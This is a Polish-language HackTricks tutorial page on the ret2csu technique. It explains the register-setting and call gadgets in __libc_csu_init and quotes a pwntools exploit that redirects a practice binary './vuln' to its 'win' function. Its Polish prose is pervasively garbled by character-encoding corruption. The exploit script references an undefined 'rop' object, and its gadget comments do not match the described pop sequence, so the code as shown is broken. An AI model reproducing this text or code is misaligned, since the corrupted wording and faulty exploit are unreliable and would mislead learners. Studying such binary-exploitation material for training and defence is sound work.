# Ret2csu

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the**  [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Podstawowe informacje

**ret2csu** to technika hackingowa u偶ywana, gdy pr贸bujesz przej kontrol nad programem, ale nie mo偶esz znale藕 **gad偶et贸w**, kt贸rych zwykle u偶ywasz do manipulowania zachowaniem programu.&#x20;

Gdy program korzysta z okrelonych bibliotek (takich jak libc), ma wbudowane funkcje do zarzdzania tym, jak r贸偶ne czci programu komunikuj si ze sob. Wr贸d tych funkcji znajduj si ukryte skarby, kt贸re mog dziaa jako nasze brakujce gad偶ety, szczeg贸lnie jeden zwany `__libc_csu_init`.

### Magiczne gad偶ety w \_\_libc\_csu\_init

W `__libc_csu_init` znajduj si dwie sekwencje instrukcji (nasze "magiczne gad偶ety"), kt贸re si wyr贸偶niaj:

1. Pierwsza sekwencja pozwala nam ustawi wartoci w kilku rejestrach (rbx, rbp, r12, r13, r14, r15). S to jakby sloty, w kt贸rych mo偶emy przechowywa liczby lub adresy, kt贸re chcemy u偶y p贸藕niej.
```armasm
pop rbx;
pop rbp;
pop r12;
pop r13;
pop r14;
pop r15;
ret;
```
Ten gad偶et pozwala nam kontrolowa te rejestry, wypychajc wartoci ze stosu do nich.

2. Druga sekwencja wykorzystuje wartoci, kt贸re ustawilimy, aby wykona kilka rzeczy:
* **Przenie konkretne wartoci do innych rejestr贸w**, przygotowujc je do u偶ycia jako parametry w funkcjach.
* **Wykonaj wywoanie do lokalizacji** okrelonej przez dodanie wartoci w r15 i rbx, a nastpnie pomno偶enie rbx przez 8.
```
mov rdx, r14;
mov rsi, r13;
mov edi, r12d;
call qword [r15 + rbx*8];
```
## Przykad

Wyobra藕 sobie, 偶e chcesz wykona syscall lub wywoa funkcj tak jak `write()`, ale potrzebujesz konkretnych wartoci w rejestrach `rdx` i `rsi` jako parametr贸w. Zwykle szukaby gad偶et贸w, kt贸re bezporednio ustawiaj te rejestry, ale nie mo偶esz ich znale藕.

Tutaj wkracza **ret2csu**:

1. **Ustaw rejestry**: U偶yj pierwszego magicznego gad偶etu, aby zrzuci wartoci ze stosu do rbx, rbp, r12 (edi), r13 (rsi), r14 (rdx) i r15.
2. **U偶yj drugiego gad偶etu**: Gdy te rejestry s ustawione, u偶ywasz drugiego gad偶etu. To pozwala ci przenie wybrane wartoci do `rdx` i `rsi` (z r14 i r13, odpowiednio), przygotowujc parametry do wywoania funkcji. Co wicej, kontrolujc `r15` i `rbx`, mo偶esz sprawi, 偶e program wywoa funkcj znajdujc si pod adresem, kt贸ry obliczasz i umieszczasz w `[r15 + rbx*8]`.

Masz [**przykad u偶ycia tej techniki i wyjanienia go tutaj**](https://ir0nstone.gitbook.io/notes/types/stack/ret2csu/exploitation), a oto ostateczny exploit, kt贸ry wykorzystano:
```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

POP_CHAIN = 0x00401224 # pop r12, r13, r14, r15, ret
REG_CALL = 0x00401208  # rdx, rsi, edi, call [r15 + rbx*8]
RW_LOC = 0x00404028

rop.raw('A' * 40)
rop.gets(RW_LOC)
rop.raw(POP_CHAIN)
rop.raw(0)                      # r12
rop.raw(0)                      # r13
rop.raw(0xdeadbeefcafed00d)     # r14 - popped into RDX!
rop.raw(RW_LOC)                 # r15 - holds location of called function!
rop.raw(REG_CALL)               # all the movs, plus the call

p.sendlineafter('me\n', rop.chain())
p.sendline(p64(elf.sym['win']))            # send to gets() so it's written
print(p.recvline())                        # should receive "Awesome work!"
```
{% hint style="warning" %}
Zauwa偶, 偶e poprzedni exploit nie ma na celu uzyskania **`RCE`**, ma na celu jedynie wywoanie funkcji o nazwie `win` (biorc adres `win` z stdin wywoujc gets w acuchu ROP i przechowujc go w r15) z trzecim argumentem o wartoci `0xdeadbeefcafed00d`.
{% endhint %}

### Dlaczego nie u偶ywa bezporednio libc?

Zazwyczaj te przypadki s r贸wnie偶 podatne na [**ret2plt**](../common-binary-protections-and-bypasses/aslr/ret2plt.md) + [**ret2lib**](ret2lib/), ale czasami musisz kontrolowa wicej parametr贸w, ni偶 mo偶na atwo kontrolowa za pomoc gad偶et贸w, kt贸re znajdziesz bezporednio w libc. Na przykad, funkcja `write()` wymaga trzech parametr贸w, a **znalezienie gad偶et贸w do ustawienia wszystkich tych parametr贸w bezporednio mo偶e by niemo偶liwe**.

{% hint style="success" %}
Ucz si i wicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz si i wicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie dla HackTricks</summary>

* Sprawd藕 [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel si trikami hackingowymi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytori贸w na githubie.

</details>
{% endhint %}
